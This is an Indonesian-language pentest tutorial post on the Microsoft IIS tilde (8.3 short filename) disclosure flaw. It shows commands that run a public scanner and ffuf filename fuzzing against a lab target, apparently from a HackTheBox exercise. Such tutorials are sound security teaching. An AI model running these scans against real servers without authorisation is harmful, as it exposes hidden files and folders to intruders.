---
title: IIS Short Names
date: 2022-05-26 17:00:22 +0700
categories: [Web Pentest, IIS]
tags: [web, iis, fuzz]     # TAG names should always be lowercase
author: nairpaa
---

[**8.3 filename**](https://en.wikipedia.org/wiki/8.3_filename) (dikenal juga sebagai **short filename**) adalah konvensi nama file yang digunakan oleh DOS dan Microsoft Windows versi lama (sebelum Windows 95 dan Windows NT 3.5). 

**8.3 filename** juga digunakan dalam sistem operasi Microsoft modern sebagai nama file alternatif untuk nama file yang panjang sebagai kompatibilitas dengan program lama.

**Microsoft IIS** dengan **.NET** versi lama yang menggunakan **8.3 filename** memiliki keretanan *unauthorized information disclosure*. Masalah ini terjadi ketika *request* yang berisi karakter *tidle* (`~`) di-*parsing* oleh server web menggunakan **8.3 filename**.

Kerentanan Ini memungkinkan penyerang untuk mendapatkan informasi nama file dan folder yang ada pada server web.


## Eksploitasi

### Step 1: IIS shortname scanner

```bash
# clone source code
➜ git clone https://github.com/lijiejie/IIS_shortname_Scanner

# jalankan iis shortname scanner
➜ python iis_shortname_Scan.py http://<target>/
➜ python iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db 
```

![IIS Shortname Scanner](/assets/img/posts/iis-short-name/1.png)

### Step 2: Fuzz sisa nama file

```bash
# fuzzing nama file
➜ ffuf -w <wordlist.txt> -u 'http://<target>/firstFUZZlast.txt' 
➜ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u 'http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt' 
```

![Fuzzing Filename](/assets/img/posts/iis-short-name/2.png)

## Referensi

- https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf
- https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#iis-short-names
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#microsoft-iis-tilde-character-vulnerability-feature-short-file-folder-name-disclosure
- https://en.wikipedia.org/wiki/8.3_filename
